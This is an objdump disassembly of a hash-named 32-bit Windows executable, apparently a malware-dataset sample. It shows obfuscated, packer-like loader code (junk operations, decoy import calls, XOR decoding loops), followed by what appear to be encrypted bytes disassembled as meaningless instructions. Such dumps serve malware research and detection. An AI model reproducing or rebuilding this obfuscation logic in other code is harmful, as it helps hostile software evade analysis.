
5b0bde11605ec1fa0ed30e7c13050a55ed6ec1225db9c81bb1f585ef4e734553.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0xa4
  401009:	mov    ecx,DWORD PTR [ebp+0x8]
  40100c:	and    DWORD PTR ds:0x425010,0x0
  401016:	jmp    0x401026
  40101b:	mov    eax,ds:0x425010
  401020:	inc    eax
  401021:	mov    ds:0x425010,eax
  401026:	cmp    DWORD PTR ds:0x425010,0x1f
  40102d:	jae    0x401080
  401033:	cmp    DWORD PTR ds:0x425010,0x7
  40103a:	jne    0x40105d
  401040:	push   0x36e0
  401045:	push   0x6272
  40104a:	push   0x42500c
  40104f:	push   0x428f
  401054:	push   DWORD PTR [ebp-0xc]
  401057:	call   DWORD PTR ds:0x421000
  40105d:	cmp    DWORD PTR ds:0x425010,0x6
  401064:	jne    0x401075
  40106a:	mov    eax,ds:0x425010
  40106f:	inc    eax
  401070:	mov    ds:0x425010,eax
  401075:	jmp    0x40101b
  40107a:	or     DWORD PTR ds:0x427010,edx
  401080:	mov    eax,0x8a85
  401085:	or     DWORD PTR ds:0x427008,0x42601c
  40108f:	xor    ax,WORD PTR [ecx+0x20]
  401093:	and    DWORD PTR ds:0x429008,0x0
  40109d:	jmp    0x4010af
  4010a2:	mov    ecx,DWORD PTR ds:0x429008
  4010a8:	inc    ecx
  4010a9:	mov    DWORD PTR ds:0x429008,ecx
  4010af:	cmp    DWORD PTR ds:0x429008,0x1d
  4010b6:	jae    0x4010f5
  4010bc:	cmp    DWORD PTR ds:0x429008,0xc
  4010c3:	jne    0x4010d4
  4010c9:	push   0x803a
  4010ce:	call   DWORD PTR ds:0x421048
  4010d4:	cmp    DWORD PTR ds:0x429008,0xb
  4010db:	jne    0x4010f0
  4010e1:	xor    ecx,ecx
  4010e3:	xor    ecx,DWORD PTR ds:0x429008
  4010e9:	inc    ecx
  4010ea:	mov    DWORD PTR ds:0x429008,ecx
  4010f0:	jmp    0x4010a2
  4010f5:	mov    ecx,0x3b4b
  4010fa:	inc    DWORD PTR ds:0x427010
  401100:	add    ax,cx
  401103:	movzx  eax,ax
  401106:	adc    ecx,DWORD PTR ds:0x428010
  40110c:	mov    DWORD PTR [ebp-0x18],eax
  40110f:	mov    ecx,DWORD PTR ds:0x41d25c
  401115:	mov    ecx,DWORD PTR [ecx]
  401117:	sub    DWORD PTR ds:0x429014,ecx
  40111d:	mov    BYTE PTR [ebp-0x1],0x61
  401121:	and    DWORD PTR ds:0x428008,ebx
  401127:	lea    eax,[ebp-0x1]
  40112a:	sbb    ecx,0x3fcf
  401130:	mov    DWORD PTR [ebp-0x10],eax
  401133:	xor    ecx,ecx
  401135:	xor    ecx,DWORD PTR ds:0x425024
  40113b:	adc    ecx,DWORD PTR ds:0x427004
  401141:	mov    DWORD PTR ds:0x425024,ecx
  401147:	mov    al,BYTE PTR [ebp-0x1]
  40114a:	mov    ecx,DWORD PTR ds:0x42901c
  401150:	sub    DWORD PTR ds:0x42500c,ecx
  401156:	mov    ecx,DWORD PTR [ebp-0x10]
  401159:	xor    al,0x6f
  40115b:	xor    DWORD PTR ds:0x427004,0x42500c
  401165:	sub    al,0xd
  401167:	mov    BYTE PTR [ecx],al
  401169:	adc    DWORD PTR ds:0x429008,0x362f
  401173:	mov    DWORD PTR [ebp-0x14],0xf89c85b6
  40117a:	mov    DWORD PTR ds:0x425020,0x1b
  401184:	cmp    DWORD PTR ds:0x425020,0x0
  40118b:	je     0x4011bb
  401191:	cmp    DWORD PTR ds:0x425020,0x24
  401198:	jne    0x4011a7
  40119e:	push   DWORD PTR [ebp-0x1c]
  4011a1:	call   DWORD PTR ds:0x421004
  4011a7:	mov    ecx,DWORD PTR ds:0x425020
  4011ad:	dec    ecx
  4011ae:	mov    DWORD PTR ds:0x425020,ecx
  4011b4:	jmp    0x401184
  4011b9:	sub    ecx,eax
  4011bb:	push   ebx
  4011bc:	and    DWORD PTR ds:0x42501c,ebx
  4011c2:	mov    DWORD PTR [ebp-0x8],0xf89c85b5
  4011c9:	mov    ecx,DWORD PTR [ebp-0x14]
  4011cc:	push   esi
  4011cd:	mov    eax,0x7510893
  4011d2:	or     esi,DWORD PTR ds:0x42500c
  4011d8:	xor    ecx,eax
  4011da:	and    DWORD PTR ds:0x425024,0x1a45
  4011e4:	mov    esi,0x3272db
  4011e9:	sub    DWORD PTR ds:0x428018,0x2ac6
  4011f3:	push   edi
  4011f4:	and    DWORD PTR ds:0x426014,0x5a76
  4011fe:	add    ecx,esi
  401200:	jmp    0x401210
  401205:	mov    dl,BYTE PTR [ebp-0x1]
  401208:	mov    BYTE PTR [ebp+ecx*1-0xa4],dl
  40120f:	inc    ecx
  401210:	mov    DWORD PTR ds:0x427010,0x6b59
  40121a:	cmp    ecx,0x40
  40121d:	mov    DWORD PTR ds:0x425020,0x57b3
  401227:	jb     0x401205
  40122d:	mov    edx,DWORD PTR [ebp-0x14]
  401230:	xor    edx,eax
  401232:	add    edx,esi
  401234:	mov    DWORD PTR ds:0x425010,0x7b99
  40123e:	jmp    0x4012e7
  401243:	adc    ecx,DWORD PTR ds:0x427014
  401249:	mov    edi,DWORD PTR [ebp+0x8]
  40124c:	sbb    DWORD PTR ds:0x426014,ebx
  401252:	mov    ecx,0x8a85
  401257:	sub    DWORD PTR ds:0x425014,0x206e
  401261:	xor    cx,WORD PTR [edi+edx*4+0x2]
  401266:	xor    edi,0x3e7b
  40126c:	mov    edi,0x3b4b
  401271:	and    DWORD PTR ds:0x425000,0x427018
  40127b:	add    cx,di
  40127e:	add    DWORD PTR ds:0x42901c,0x429008
  401288:	movzx  ecx,cx
  40128b:	sbb    DWORD PTR ds:0x428004,0x754
  401295:	mov    DWORD PTR [ebp-0x10],ecx
  401298:	sub    DWORD PTR ds:0x42800c,0x1052
  4012a2:	mov    ecx,DWORD PTR [ebp+0x8]
  4012a5:	xor    DWORD PTR ds:0x426018,0x427004
  4012af:	movzx  ecx,WORD PTR [ecx+edx*4]
  4012b3:	or     DWORD PTR ds:0x429018,0x4238
  4012bd:	xor    ecx,0x8a85
  4012c3:	sbb    DWORD PTR ds:0x426014,0x4641
  4012cd:	add    ecx,edi
  4012cf:	mov    DWORD PTR ds:0x428018,ecx
  4012d5:	mov    edi,DWORD PTR [ebp-0x10]
  4012d8:	mov    BYTE PTR [ebp+edi*1-0xa4],cl
  4012df:	movzx  ecx,BYTE PTR ds:0x425000
  4012e6:	inc    edx
  4012e7:	mov    ecx,DWORD PTR [ebp-0x18]
  4012ea:	mov    DWORD PTR ds:0x428014,0x5338
  4012f4:	cmp    edx,ecx
  4012f6:	mov    DWORD PTR ds:0x425020,0x6df9
  401300:	jne    0x401243
  401306:	mov    ecx,DWORD PTR [ebp-0x14]
  401309:	mov    DWORD PTR ds:0x425010,0x1f
  401313:	cmp    DWORD PTR ds:0x425010,0x0
  40131a:	je     0x401367
  401320:	cmp    DWORD PTR ds:0x425010,0x25
  401327:	jne    0x40134b
  40132d:	push   0x41feeb
  401332:	push   0x8a20
  401337:	push   DWORD PTR [ebp-0x10]
  40133a:	push   DWORD PTR [ebp-0x14]
  40133d:	push   0x4d55
  401342:	push   DWORD PTR [ebp-0x1c]
  401345:	call   DWORD PTR ds:0x42104c
  40134b:	mov    edx,DWORD PTR ds:0x425010
  401351:	dec    edx
  401352:	mov    DWORD PTR ds:0x425010,edx
  401358:	jmp    0x401313
  40135d:	xor    DWORD PTR ds:0x428008,0x4304
  401367:	mov    edx,DWORD PTR [ebp+0x10]
  40136a:	add    DWORD PTR ds:0x425008,0x427004
  401374:	xor    ecx,eax
  401376:	or     DWORD PTR ds:0x426014,0x42701c
  401380:	add    ecx,esi
  401382:	mov    DWORD PTR [edx],ecx
  401384:	sbb    DWORD PTR ds:0x429004,0x53ee
  40138e:	mov    ecx,DWORD PTR [ebp-0x14]
  401391:	xor    ecx,eax
  401393:	add    ecx,esi
  401395:	mov    DWORD PTR [ebp-0x20],ecx
  401398:	mov    DWORD PTR [ebp+0x8],0xf89c85b6
  40139f:	mov    DWORD PTR [ebp-0xc],0xf89c85a6
  4013a6:	mov    DWORD PTR [ebp-0x1c],0xf89c95b6
  4013ad:	mov    ecx,DWORD PTR [ebp-0xc]
  4013b0:	mov    DWORD PTR [ebp+0x8],ecx
  4013b3:	mov    DWORD PTR ds:0x42801c,0x197a
  4013bd:	jmp    0x4015fd
  4013c2:	movzx  edx,BYTE PTR ds:0x426010
  4013c9:	sbb    DWORD PTR ds:0x42600c,edx
  4013cf:	mov    ecx,DWORD PTR [ebp+0x8]
  4013d2:	xor    edx,edx
  4013d4:	xor    edx,DWORD PTR ds:0x426018
  4013da:	or     edx,DWORD PTR ds:0x42500c
  4013e0:	mov    DWORD PTR ds:0x426018,edx
  4013e6:	mov    edx,DWORD PTR [ebp-0x8]
  4013e9:	xor    ecx,eax
  4013eb:	mov    DWORD PTR ds:0x427008,0x2495
  4013f5:	xor    edx,eax
  4013f7:	add    DWORD PTR ds:0x426010,0x397c
  401401:	sub    ecx,edx
  401403:	sub    DWORD PTR ds:0x425020,0x386b
  40140d:	sub    ecx,esi
  40140f:	xor    edx,edx
  401411:	or     edx,DWORD PTR ds:0x428004
  401417:	sub    DWORD PTR ds:0x42501c,edx
  40141d:	xor    ecx,eax
  40141f:	mov    DWORD PTR [ebp+0x8],ecx
  401422:	mov    ecx,DWORD PTR [ebp+0x8]
  401425:	mov    edx,DWORD PTR [ebp-0x64]
  401428:	lea    ecx,[edx+ecx*1+0x5708f5]
  40142f:	mov    DWORD PTR [ebp-0x64],ecx
  401432:	mov    DWORD PTR ds:0x428004,0x1f
  40143c:	cmp    DWORD PTR ds:0x428004,0x0
  401443:	je     0x40147a
  401449:	cmp    DWORD PTR ds:0x428004,0x29
  401450:	jne    0x401466
  401456:	push   0x41ff61
  40145b:	push   0x870a
  401460:	call   DWORD PTR ds:0x421008
  401466:	mov    ecx,DWORD PTR ds:0x428004
  40146c:	dec    ecx
  40146d:	mov    DWORD PTR ds:0x428004,ecx
  401473:	jmp    0x40143c
  401478:	and    edx,ecx
  40147a:	mov    ecx,DWORD PTR [ebp+0x8]
  40147d:	or     edx,DWORD PTR ds:0x429014
  401483:	mov    edx,DWORD PTR [ebp-0x60]
  401486:	sbb    DWORD PTR ds:0x42501c,0x5031
  401490:	lea    ecx,[edx+ecx*1+0x5708f5]
  401497:	inc    edx
  401498:	mov    DWORD PTR [ebp-0x60],ecx
  40149b:	mov    ecx,DWORD PTR [ebp+0x8]
  40149e:	mov    edx,DWORD PTR [ebp-0x5c]
  4014a1:	sub    DWORD PTR ds:0x429018,0x425020
  4014ab:	lea    ecx,[edx+ecx*1+0x5708f4]
  4014b2:	and    DWORD PTR ds:0x429010,0x0
  4014bc:	mov    edx,DWORD PTR ds:0x429010
  4014c2:	inc    edx
  4014c3:	mov    DWORD PTR ds:0x429010,edx
  4014c9:	cmp    DWORD PTR ds:0x429010,0x1b
  4014d0:	jne    0x4014e1
  4014d6:	push   0x8182
  4014db:	call   DWORD PTR ds:0x421014
  4014e1:	cmp    DWORD PTR ds:0x429010,0x11
  4014e8:	jb     0x4014bc
  4014ee:	mov    DWORD PTR [ebp-0x5c],ecx
  4014f1:	sbb    edx,0x6f22
  4014f7:	mov    ecx,DWORD PTR [ebp+0x8]
  4014fa:	and    DWORD PTR ds:0x425008,0x0
  401504:	mov    edx,DWORD PTR ds:0x425008
  40150a:	inc    edx
  40150b:	mov    DWORD PTR ds:0x425008,edx
  401511:	cmp    DWORD PTR ds:0x425008,0x16
  401518:	jne    0x40152e
  40151e:	push   0x41ff81
  401523:	push   0x41febb
  401528:	call   DWORD PTR ds:0x421050
  40152e:	cmp    DWORD PTR ds:0x425008,0x14
  401535:	jb     0x401504
  40153b:	mov    edx,DWORD PTR [ebp-0x58]
  40153e:	xor    DWORD PTR ds:0x429008,0x42900c
  401548:	lea    ecx,[edx+ecx*1+0x5708fb]
  40154f:	and    DWORD PTR ds:0x42801c,0x0
  401559:	mov    edx,DWORD PTR ds:0x42801c
  40155f:	inc    edx
  401560:	mov    DWORD PTR ds:0x42801c,edx
  401566:	cmp    DWORD PTR ds:0x42801c,0x1f
  40156d:	jne    0x401583
  401573:	push   0x3426
  401578:	push   0x86d1
  40157d:	call   DWORD PTR ds:0x421054
  401583:	cmp    DWORD PTR ds:0x42801c,0x17
  40158a:	jb     0x401559
  401590:	mov    DWORD PTR [ebp-0x58],ecx
  401593:	mov    ecx,DWORD PTR [ebp+0x8]
  401596:	mov    edx,DWORD PTR [ebp-0x54]
  401599:	lea    ecx,[edx+ecx*1+0x5708fa]
  4015a0:	and    DWORD PTR ds:0x426010,0x0
  4015aa:	mov    edx,DWORD PTR ds:0x426010
  4015b0:	inc    edx
  4015b1:	mov    DWORD PTR ds:0x426010,edx
  4015b7:	cmp    DWORD PTR ds:0x426010,0x2b
  4015be:	jne    0x4015cd
  4015c4:	push   DWORD PTR [ebp-0x24]
  4015c7:	call   DWORD PTR ds:0x421018
  4015cd:	cmp    DWORD PTR ds:0x426010,0x1e
  4015d4:	jb     0x4015aa
  4015da:	mov    DWORD PTR [ebp-0x54],ecx
  4015dd:	or     ecx,0x6900
  4015e3:	mov    ecx,DWORD PTR [ebp+0x8]
  4015e6:	and    DWORD PTR ds:0x426000,0x2d7e
  4015f0:	mov    edx,DWORD PTR [ebp-0x50]
  4015f3:	lea    ecx,[edx+ecx*1+0x5708f9]
  4015fa:	mov    DWORD PTR [ebp-0x50],ecx
  4015fd:	xor    ecx,0x7fc1
  401603:	mov    ecx,DWORD PTR [ebp+0x8]
  401606:	xor    ecx,eax
  401608:	add    ecx,esi
  40160a:	jne    0x4013c2
  401610:	mov    DWORD PTR ds:0x425028,0xb4d
  40161a:	jmp    0x401891
  40161f:	and    DWORD PTR ds:0x425024,0x0
  401629:	jmp    0x40163b
  40162e:	mov    edx,DWORD PTR ds:0x425024
  401634:	inc    edx
  401635:	mov    DWORD PTR ds:0x425024,edx
  40163b:	cmp    DWORD PTR ds:0x425024,0x13
  401642:	jae    0x40168a
  401648:	cmp    DWORD PTR ds:0x425024,0x4
  40164f:	jne    0x40166b
  401655:	push   0x84c6
  40165a:	push   DWORD PTR [ebp-0xc]
  40165d:	push   DWORD PTR [ebp-0x10]
  401660:	push   0x5448
  401665:	call   DWORD PTR ds:0x42101c
  40166b:	cmp    DWORD PTR ds:0x425024,0x3
  401672:	jne    0x401685
  401678:	mov    edx,DWORD PTR ds:0x425024
  40167e:	inc    edx
  40167f:	mov    DWORD PTR ds:0x425024,edx
  401685:	jmp    0x40162e
  40168a:	mov    ecx,DWORD PTR [ebp-0x1c]
  40168d:	or     DWORD PTR ds:0x427010,0x1874
  401697:	mov    edx,DWORD PTR [ebp-0x8]
  40169a:	or     DWORD PTR ds:0x42900c,0x427008
  4016a4:	xor    ecx,eax
  4016a6:	add    DWORD PTR ds:0x425028,0x427010
  4016b0:	xor    edx,eax
  4016b2:	sub    ecx,edx
  4016b4:	sub    ecx,esi
  4016b6:	xor    ecx,eax
  4016b8:	mov    DWORD PTR ds:0x426018,0x1f6a
  4016c2:	mov    DWORD PTR [ebp-0x1c],ecx
  4016c5:	mov    ecx,DWORD PTR [ebp-0xc]
  4016c8:	mov    DWORD PTR [ebp+0x8],ecx
  4016cb:	jmp    0x4016fd
  4016d0:	mov    ecx,DWORD PTR [ebp+0x8]
  4016d3:	mov    edx,DWORD PTR [ebp-0x8]
  4016d6:	xor    ecx,eax
  4016d8:	xor    edx,eax
  4016da:	sub    ecx,edx
  4016dc:	sub    ecx,esi
  4016de:	xor    ecx,eax
  4016e0:	mov    DWORD PTR [ebp+0x8],ecx
  4016e3:	mov    ecx,DWORD PTR [ebp+0x8]
  4016e6:	mov    edx,DWORD PTR [ebp+0x8]
  4016e9:	imul   edx,edx,0x5708f5
  4016ef:	xor    ecx,eax
  4016f1:	add    ecx,esi
  4016f3:	lea    ecx,[ebp+ecx*4-0x64]
  4016f7:	mov    edi,DWORD PTR [ecx]
  4016f9:	add    edx,edi
  4016fb:	mov    DWORD PTR [ecx],edx
  4016fd:	mov    ecx,DWORD PTR [ebp+0x8]
  401700:	xor    ecx,eax
  401702:	add    ecx,esi
  401704:	jne    0x4016d0
  40170a:	mov    ecx,DWORD PTR [ebp-0x20]
  40170d:	mov    cl,BYTE PTR [ebp+ecx*1-0xa4]
  401714:	mov    dl,BYTE PTR [ebp-0x1]
  401717:	cmp    cl,dl
  401719:	je     0x4017f2
  40171f:	mov    ecx,DWORD PTR [ebp-0x20]
  401722:	mov    cl,BYTE PTR [ebp+ecx*1-0xa4]
  401729:	mov    edx,DWORD PTR [ebp+0xc]
  40172c:	cmp    cl,BYTE PTR [edx]
  40172e:	jne    0x4018a3
  401734:	mov    ecx,DWORD PTR [ebp-0x14]
  401737:	mov    edx,DWORD PTR [ebp+0xc]
  40173a:	movsx  edx,BYTE PTR [edx]
  40173d:	xor    ecx,eax
  40173f:	add    ecx,esi
  401741:	cmp    edx,ecx
  401743:	mov    ecx,DWORD PTR [ebp-0xc]
  401746:	mov    DWORD PTR [ebp+0x8],ecx
  401749:	mov    ecx,DWORD PTR [ebp+0x8]
  40174c:	je     0x403ca2
  401752:	jmp    0x401787
  401757:	mov    ecx,DWORD PTR [ebp+0x8]
  40175a:	mov    edx,DWORD PTR [ebp-0x8]
  40175d:	xor    ecx,eax
  40175f:	xor    edx,eax
  401761:	sub    ecx,edx
  401763:	sub    ecx,esi
  401765:	xor    ecx,eax
  401767:	mov    DWORD PTR [ebp+0x8],ecx
  40176a:	mov    ecx,DWORD PTR [ebp+0x8]
  40176d:	mov    edx,DWORD PTR [ebp+0x8]
  401770:	xor    ecx,eax
  401772:	imul   edx,edx,0x5708f5
  401778:	add    ecx,esi
  40177a:	lea    ecx,[ebp+ecx*4-0x64]
  40177e:	mov    edi,DWORD PTR [ecx]
  401780:	add    edx,edi
  401782:	mov    DWORD PTR [ecx],edx
  401784:	mov    ecx,DWORD PTR [ebp+0x8]
  401787:	xor    ecx,eax
  401789:	add    ecx,esi
  40178b:	jne    0x401757
  401791:	mov    ecx,DWORD PTR [ebp-0x14]
  401794:	mov    edx,DWORD PTR [ebp+0x8]
  401797:	xor    ecx,eax
  401799:	xor    edx,eax
  40179b:	add    ecx,esi
  40179d:	add    edx,esi
  40179f:	cmp    ecx,edx
  4017a1:	jae    0x401837
  4017a7:	lea    edx,[ecx-0x3272db]
  4017ad:	mov    DWORD PTR [ebp-0x18],edx
  4017b0:	mov    edi,DWORD PTR [ebp-0x18]
  4017b3:	mov    DWORD PTR [ebp-0x24],0x705fd08
  4017ba:	lea    edx,[ebp-0x24]
  4017bd:	mov    DWORD PTR [ebp-0x10],edx
  4017c0:	mov    edx,DWORD PTR [ebp-0x10]
  4017c3:	add    DWORD PTR [edx],0x705fa08
  4017c9:	mov    ebx,DWORD PTR [ebp-0x10]
  4017cc:	xor    edi,eax
  4017ce:	add    edi,DWORD PTR [ebx]
  4017d0:	lea    edx,[ebp+ecx*4-0x64]
  4017d4:	mov    ebx,DWORD PTR [edx]
  4017d6:	xor    edi,ebx
  4017d8:	mov    DWORD PTR [edx],edi
  4017da:	mov    edx,DWORD PTR [ebp+0x8]
  4017dd:	xor    edx,eax
  4017df:	inc    ecx
  4017e0:	inc    DWORD PTR [ebp-0x18]
  4017e3:	add    edx,esi
  4017e5:	cmp    ecx,edx
  4017e7:	jb     0x4017b0
  4017ed:	jmp    0x401837
  4017f2:	mov    ecx,DWORD PTR [ebp-0xc]
  4017f5:	mov    DWORD PTR [ebp+0x8],ecx
  4017f8:	jmp    0x40182a
  4017fd:	mov    ecx,DWORD PTR [ebp+0x8]
  401800:	mov    edx,DWORD PTR [ebp-0x8]
  401803:	xor    ecx,eax
  401805:	xor    edx,eax
  401807:	sub    ecx,edx
  401809:	sub    ecx,esi
  40180b:	xor    ecx,eax
  40180d:	mov    DWORD PTR [ebp+0x8],ecx
  401810:	mov    ecx,DWORD PTR [ebp+0x8]
  401813:	mov    edx,DWORD PTR [ebp+0x8]
  401816:	imul   edx,edx,0x5708f5
  40181c:	xor    ecx,eax
  40181e:	add    ecx,esi
  401820:	lea    ecx,[ebp+ecx*4-0x64]
  401824:	mov    edi,DWORD PTR [ecx]
  401826:	add    edx,edi
  401828:	mov    DWORD PTR [ecx],edx
  40182a:	mov    ecx,DWORD PTR [ebp+0x8]
  40182d:	xor    ecx,eax
  40182f:	add    ecx,esi
  401831:	jne    0x4017fd
  401837:	mov    ecx,DWORD PTR [ebp-0xc]
  40183a:	mov    DWORD PTR [ebp+0x8],ecx
  40183d:	jmp    0x40186f
  401842:	mov    ecx,DWORD PTR [ebp+0x8]
  401845:	mov    edx,DWORD PTR [ebp-0x8]
  401848:	xor    ecx,eax
  40184a:	xor    edx,eax
  40184c:	sub    ecx,edx
  40184e:	sub    ecx,esi
  401850:	xor    ecx,eax
  401852:	mov    DWORD PTR [ebp+0x8],ecx
  401855:	mov    ecx,DWORD PTR [ebp+0x8]
  401858:	mov    edx,DWORD PTR [ebp+0x8]
  40185b:	imul   edx,edx,0x5708f5
  401861:	xor    ecx,eax
  401863:	add    ecx,esi
  401865:	lea    ecx,[ebp+ecx*4-0x64]
  401869:	mov    edi,DWORD PTR [ecx]
  40186b:	add    edx,edi
  40186d:	mov    DWORD PTR [ecx],edx
  40186f:	mov    ecx,DWORD PTR [ebp+0x8]
  401872:	xor    ecx,eax
  401874:	add    ecx,esi
  401876:	jne    0x401842
  40187c:	mov    ecx,DWORD PTR [ebp-0x8]
  40187f:	mov    edx,DWORD PTR [ebp-0x20]
  401882:	xor    ecx,eax
  401884:	lea    ecx,[ecx+edx*1+0x3272db]
  40188b:	mov    DWORD PTR [ebp-0x20],ecx
  40188e:	inc    DWORD PTR [ebp+0xc]
  401891:	mov    ecx,DWORD PTR [ebp-0x1c]
  401894:	xor    ecx,eax
  401896:	add    ecx,esi
  401898:	jne    0x40161f
  40189e:	jmp    0x403cac
  4018a3:	mov    ecx,DWORD PTR [ebp-0xc]
  4018a6:	mov    DWORD PTR [ebp+0x8],ecx
  4018a9:	jmp    0x4018db
  4018ae:	mov    ecx,DWORD PTR [ebp+0x8]
  4018b1:	mov    edx,DWORD PTR [ebp-0x8]
  4018b4:	xor    ecx,eax
  4018b6:	xor    edx,eax
  4018b8:	sub    ecx,edx
  4018ba:	sub    ecx,esi
  4018bc:	xor    ecx,eax
  4018be:	mov    DWORD PTR [ebp+0x8],ecx
  4018c1:	mov    ecx,DWORD PTR [ebp+0x8]
  4018c4:	mov    edx,DWORD PTR [ebp+0x8]
  4018c7:	imul   edx,edx,0x5708f5
  4018cd:	xor    ecx,eax
  4018cf:	add    ecx,esi
  4018d1:	lea    ecx,[ebp+ecx*4-0x64]
  4018d5:	mov    edi,DWORD PTR [ecx]
  4018d7:	add    edx,edi
  4018d9:	mov    DWORD PTR [ecx],edx
  4018db:	mov    ecx,DWORD PTR [ebp+0x8]
  4018de:	xor    ecx,eax
  4018e0:	add    ecx,esi
  4018e2:	jne    0x4018ae
  4018e8:	jmp    0x403cb8
  4018ed:	mov    ecx,DWORD PTR [ebp+0x8]
  4018f0:	mov    edx,DWORD PTR [ebp-0x8]
  4018f3:	xor    ecx,eax
  4018f5:	xor    edx,eax
  4018f7:	sub    ecx,edx
  4018f9:	sub    ecx,esi
  4018fb:	jmp    0x403c80
  401900:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401901:	js     0x401926
  401903:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401904:	mov    ds:0x673a7a3,eax
  401909:	je     0x401894
  40190b:	stos   DWORD PTR es:[edi],eax
  40190c:	jns    0x4018fe
  40190e:	dec    esp
  40190f:	push   edx
  401910:	bound  esp,QWORD PTR [edx+0x62]
  401913:	bound  ebx,QWORD PTR [edx]
  401915:	pop    edi
  401916:	bound  esp,QWORD PTR [edx+0x9]
  401919:	xor    BYTE PTR [edi],al
  40191b:	cmp    eax,0xf033905
  401920:	jns    0x4018b2
  401922:	jbe    0x40199a
  401924:	add    al,0xa6
  401926:	jb     0x40199a
  401928:	jno    0x401954
  40192a:	fld    st(0)
  40192c:	std    
  40192d:	dec    esp
  40192e:	push   esp
  40192f:	jae    0x4019ae
  401931:	inc    ebx
  401932:	mov    WORD PTR [ecx+esi*2+0x45],?
  401936:	scas   eax,DWORD PTR es:[edi]
  401937:	inc    ecx
  401938:	push   edx
  401939:	cmp    al,0x90
  40193b:	loop   0x4018d4
  40193d:	data16 jnp 0x40196b
  401940:	call   0x26d1:0xfbbbb819
  401947:	hlt    
  401948:	xor    BYTE PTR [ebx+0x5811b5de],bl
  40194e:	dec    ebp
  40194f:	and    bl,cl
  401951:	std    
  401952:	pop    ds
  401953:	int    0x30
  401955:	xor    BYTE PTR [ebx+0x79a0c1de],cl
  40195b:	test   al,0x21
  40195d:	mov    al,ds:0x6ad39963
  401962:	clc    
  401963:	cmp    DWORD PTR [edi-0x74],esi
  401966:	mov    ecx,DWORD PTR [ebx+0x38d84edc]
  40196c:	mov    ecx,0x536582b9
  401971:	mov    ch,0x26
  401973:	idiv   BYTE PTR es:[ebx+0x2a413552]
  40197a:	push   es
  40197b:	arpl   sp,bx
  40197d:	push   edi
  40197e:	jne    0x401920
  401980:	and    ch,bh
  401982:	stos   BYTE PTR es:[edi],al
  401983:	adc    al,0xd1
  401985:	cmp    esi,eax
  401987:	mov    al,0x56
  401989:	dec    edi
  40198a:	ret    
  40198b:	adc    al,0x67
  40198d:	and    ebx,DWORD PTR [eax-0x5a2f20df]
  401993:	jmp    0x43e55a22
  401998:	fwait
  401999:	into   
  40199a:	or     al,0xa3
  40199c:	div    DWORD PTR [edi+0x5]
  40199f:	mov    esi,0x9d47fa53
  4019a4:	add    ebx,esi
  4019a6:	retw   0x3f19
  4019aa:	sti    
  4019ab:	retf   0xf32e
  4019ae:	xor    esi,DWORD PTR [ebx]
  4019b0:	or     edi,edx
  4019b2:	and    BYTE PTR [edx+0x78],ah
  4019b5:	or     BYTE PTR [edi+0x32],bl
  4019b8:	mov    esi,0xfa5ab8f1
  4019bd:	mov    ecx,0x84a92237
  4019c2:	out    dx,eax
  4019c3:	sub    ebp,esp
  4019c5:	mov    dl,0x88
  4019c7:	jp     0x401a07
  4019c9:	push   esi
  4019ca:	mov    al,ds:0x3571b9b
  4019cf:	loopne 0x401980
  4019d1:	bound  esp,QWORD PTR ds:0x5a482bd2
  4019d7:	into   
  4019d8:	jmp    0x5a26:0x44120e61
  4019df:	repz push ds
  4019e1:	push   ebx
  4019e2:	icebp  
  4019e3:	cld    
  4019e4:	dec    eax
  4019e5:	and    al,0x11
  4019e7:	ins    BYTE PTR es:[edi],dx
  4019e8:	ret    
  4019e9:	std    
  4019ea:	mov    esi,0x8db677e0
  4019ef:	popa   
  4019f0:	aad    0x64
  4019f2:	packssdw mm7,QWORD PTR [esi]
  4019f5:	sar    DWORD PTR [edx],1
  4019f7:	js     0x401987
  4019f9:	push   ebx
  4019fa:	outs   dx,DWORD PTR ds:[esi]
  4019fb:	sub    ah,0x84
  4019fe:	pop    ebx
  4019ff:	pop    ss
  401a00:	je     0x401a28
  401a02:	leave  
  401a03:	das    
  401a04:	dec    eax
  401a05:	test   al,0xfd
  401a07:	pop    edx
  401a08:	pop    esi
  401a09:	mov    bh,0xf4
  401a0b:	adc    eax,0x9fd8e25f
  401a10:	call   esi
  401a12:	call   FWORD PTR [ebx-0x1fce61c3]
  401a18:	shl    DWORD PTR [eax-0x6f],cl
  401a1b:	sub    edi,DWORD PTR [edx+0x33c148d6]
  401a21:	adc    eax,0x3b6dd909
  401a26:	sub    eax,0x399821ca
  401a2b:	xchg   edi,ebp
  401a2d:	cmp    DWORD PTR [ecx+ebp*4],ecx
  401a30:	jp     0x401aa3
  401a32:	and    BYTE PTR [ecx],al
  401a34:	inc    eax
  401a35:	and    esp,edx
  401a37:	xchg   DWORD PTR [edi+esi*8+0x27f245de],esi
  401a3e:	jmp    0x401a16
  401a40:	in     al,dx
  401a41:	sub    ecx,ebp
  401a43:	inc    esi
  401a44:	into   
  401a45:	add    ebx,DWORD PTR [eax+0x1c229d0c]
  401a4b:	rcr    BYTE PTR [ebp+0x63],1
  401a4e:	or     al,0x98
  401a50:	fisttp QWORD PTR [edx-0x263061d9]
  401a56:	mov    eax,ds:0xd178ef39
  401a5b:	xchg   esi,eax
  401a5c:	jne    0x401a77
  401a5e:	and    DWORD PTR [ebp+0x60],ecx
  401a61:	fist   WORD PTR [ebx-0x98753ee]
  401a67:	mov    ah,0x6d
  401a69:	and    BYTE PTR [eax],bh
  401a6b:	mov    eax,ds:0xe6c2ed8
  401a70:	mov    ecx,esi
  401a72:	jg     0x401a1d
  401a74:	(bad)  
  401a75:	fadd   QWORD PTR ds:0xbfd9afb3
  401a7b:	and    ah,BYTE PTR ds:[ebx-0x13]
  401a7f:	push   0x18f77a41
  401a84:	mov    esp,0xa4ea20ff
  401a89:	jno    0x401a12
  401a8b:	call   0xa02c7a51
  401a90:	dec    eax
  401a91:	inc    edi
  401a92:	mov    ebx,0xe3b3df9f
  401a97:	xlat   BYTE PTR ds:[ebx]
  401a98:	cwde   
  401a99:	and    BYTE PTR [ebx+0x539e1d11],ch
  401a9f:	not    DWORD PTR [esi]
  401aa1:	jmp    0xc3a0:0xeca1b808
  401aa8:	(bad)  
  401aa9:	cld    
  401aaa:	popf   
  401aab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401aac:	stos   BYTE PTR es:[edi],al
  401aad:	pop    esi
  401aae:	jecxz  0x401b1a
  401ab0:	or     BYTE PTR [esi+ebx*8],ch
  401ab3:	aas    
